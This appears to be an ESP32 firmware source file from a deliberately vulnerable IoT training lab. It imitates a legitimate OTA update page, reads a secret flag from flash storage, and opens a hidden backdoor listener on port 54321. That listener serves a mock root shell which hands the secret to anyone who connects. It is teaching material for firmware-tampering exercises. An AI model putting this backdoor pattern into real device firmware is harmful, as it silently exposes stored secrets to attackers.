#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <ElegantOTA.h>
#include <Preferences.h>

// WiFi
static const char* AP_SSID = "DVID-OTA";

// Serveur web port 80
WebServer server(80);

// Backdoor
static const uint16_t BACKDOOR_PORT = 54321;
WiFiServer backdoor(BACKDOOR_PORT);
WiFiClient shell;

Preferences prefs;

// Secret lu depuis la NVS (depose par le firmware legitime)
String stolen;

// Mini interpreteur : le secret est en NVS, les commandes lisent la NVS.
void handleCommand(WiFiClient& c, const String& cmd) {
    if (cmd == "help") {
        c.println("commands: nvs, nvs get <key>, whoami, id, help, exit");
    } else if (cmd == "nvs" || cmd == "nvs list") {
        c.println("namespace 'dvid':");
        c.println("  flag (str)");
    } else if (cmd == "nvs get flag") {
        c.println(stolen);
    } else if (cmd.startsWith("nvs get ")) {
        c.println("nvs: key not found");
    } else if (cmd == "whoami" || cmd == "id") {
        c.println("root");
    } else if (cmd == "exit") {
        c.println("bye");
        c.stop();
    } else if (cmd.length()) {
        c.println("sh: " + cmd + ": command not found");
    }
}

void setup() {
    Serial.begin(115200);

    // Lecture du secret laisse en NVS par le firmware legitime.
    prefs.begin("dvid", true);
    stolen = prefs.getString("flag", "<vide>");
    prefs.end();

    // Meme point d'acces WiFi ouvert que le legit.
    WiFi.mode(WIFI_AP);
    WiFi.softAP(AP_SSID);
    Serial.print("AP IP: ");
    Serial.println(WiFi.softAPIP());

    // Pages web identiques au firmware legitime : rien ne trahit la compromission.
    server.on("/", []() {
        server.send(200, "text/html",
            "<h1>DVID - OTA Update</h1>"
            "<p>Firmware update: <a href=\"/update\">/update</a></p>");
    });
    ElegantOTA.begin(&server);
    server.begin();

    // Ouverture discrete de la backdoor.
    backdoor.begin();
}

void loop() {
    server.handleClient();
    ElegantOTA.loop();

    // Accepte une seule session shell a la fois.
    if (backdoor.hasClient()) {
        if (!shell || !shell.connected()) {
            shell = backdoor.available();
            shell.println("DVID embedded shell");
            shell.print("$ ");
        } else {
            backdoor.available().stop();
        }
    }

    if (shell && shell.connected() && shell.available()) {
        String line = shell.readStringUntil('\n');
        line.trim();
        handleCommand(shell, line);
        if (shell.connected()) shell.print("$ ");
    }
}
